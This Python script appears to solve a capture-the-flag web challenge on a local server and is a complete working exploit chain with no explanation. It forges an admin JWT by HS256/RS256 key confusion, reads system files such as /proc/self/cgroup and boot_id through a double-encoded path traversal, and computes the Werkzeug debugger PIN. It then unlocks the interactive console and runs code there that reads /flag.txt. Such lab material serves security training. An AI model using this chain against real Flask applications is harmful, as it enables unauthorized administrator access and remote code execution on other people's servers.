import hashlib
import html
import re
import secrets
import urllib.parse
from itertools import chain

import jwt
import requests

URL = "http://127.0.0.1:1337"


jwt.get_algorithm_by_name("HS256").prepare_key = lambda k: k if isinstance(k, bytes) else k.encode("utf-8")


def gen(pub,priv):
  h = hashlib.sha1()

  for bit in chain(pub, priv):
    if not bit:
      continue
    if isinstance(bit, str):
      bit = bit.encode("utf-8")
    h.update(bit)

  h.update(b'cookiesalt')
  h.update(b'pinsalt')
  
  num = ('%09d' % int(h.hexdigest(), 16))[:9]

  rv = None
  for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
      rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                    for x in range(0, len(num), group_size))
      break
  else:
    rv = num

  return rv


def solve():
  session = requests.Session()

  # Login
  print("[*] Logging in")
  data = {"username": "test_user", "password": "password"}
  r = session.post(URL + "/login", data=data)
  r.raise_for_status()
  token = session.cookies.get("post_it_token")
  print(f"[*] Got token: {token}")
  
  # Get pubkey
  print("\n[*] Getting pubkey")
  r = session.get(URL + "/pubkey")
  r.raise_for_status()
  pubkey = r.text.strip()
  print(f"[*] Got pubkey: {pubkey}")

  # Modify the JWT
  print("\n[*] Modifying the JWT")
  data = jwt.decode(token, options={"verify_signature": False})
  data["admin"] = True
  new_token = jwt.encode(data, pubkey, algorithm="HS256")
  print(f"[*] Modified JWT: {new_token}")
  session = requests.Session()
  session.cookies.set("post_it_token", new_token)

  # Check if the JWT works
  print("\n[*] Checking if the JWT works")
  r = session.get(URL)
  r.raise_for_status()
  assert "admin" in r.text.lower()

  pattern = re.compile('<pre class="bg-white rounded p-3"><code>(.*?)<\\/code><\\/pre>', re.S)

  # Get required info to create PIN
  print("\n[*] Getting network interface")
  r = session.get(URL + "/view/..%252F..%252Fproc/net/arp")
  r.raise_for_status()
  content = r.text
  print(f"[*] ARP table: \n{content}")
  arp = re.findall(pattern, content)[0]
  print(f"[*] ARP table: \n{arp}")
  net = arp.split("\n")[1].split()[-1]
  print(f"[*] Network interface name: {net}")

  print("\n[*] Getting MAC address")
  r = session.get(URL + f"/view/..%252F..%252Fsys/class/net/{net}/address")
  r.raise_for_status()
  content = r.text
  mac = re.findall(pattern, content)[0].strip()
  print(f"[*] MAC address: {mac}")
  mac = str(int(mac.replace(":", ""), 16))

  print("\n[*] Getting boot ID")
  r = session.get(URL + "/view/..%252F..%252Fproc/sys/kernel/random/boot_id")
  r.raise_for_status()
  content = r.text
  boot_id = re.findall(pattern, content)[0].strip()
  print(f"[*] Boot ID: {boot_id}")

  print("\n[*] Getting cgroup")
  r = session.get(URL + "/view/..%252F..%252Fproc/self/cgroup")
  r.raise_for_status()
  content = r.text
  cgroup = re.findall(pattern, content)[0].strip()
  cgroup = cgroup.split("\n")[0].strip().rpartition("/")[2]
  print(f"[*] cgroup: {cgroup}")

  machine_id = boot_id + cgroup

  # Generate PIN
  print("\n[*] Generating PIN")
  pub = [
    "app",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.11/site-packages/flask/app.py"
  ]

  priv = [
    mac,
    machine_id
  ]

  pin = gen(pub, priv)
  print(f"[*] Generated PIN: {pin}")

  # Go to console
  print("\n[*] Going to console")
  r = session.get(URL + "/console")
  r.raise_for_status()
  secret = None
  for line in r.text.split("\n"):
    if (
      line.strip().startswith("SECRET = \"") and
      line.strip().endswith("\";")
    ):
      secret = line.strip().split(" = \"")[-1].strip("\";")
      break
  else:
    print("[!] Could not find secret in HTML")
    print("[!] HTML was:")
    print(r.text)
    raise Exception("Could not find secret in HTML")
  print(f"[*] Console secret: {secret}")
  enc_secret = urllib.parse.quote(secret, safe='~()*!\'')

  # Send PIN
  r = session.get(f"{URL}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={enc_secret}")
  r.raise_for_status()
  assert r.json()["auth"] == True

  # Get flag
  r = session.get(f"{URL }/console?&__debugger__=yes&cmd=print(open(%22%2Fflag.txt%22).read())&frm=0&s={enc_secret}")
  r.raise_for_status()
  assert r.text.startswith(">>>")
  flag = html.unescape("\n".join(r.text.splitlines()[1:]))
  print(f"\n[*] Flag: {flag}")


if __name__ == "__main__":
  solve()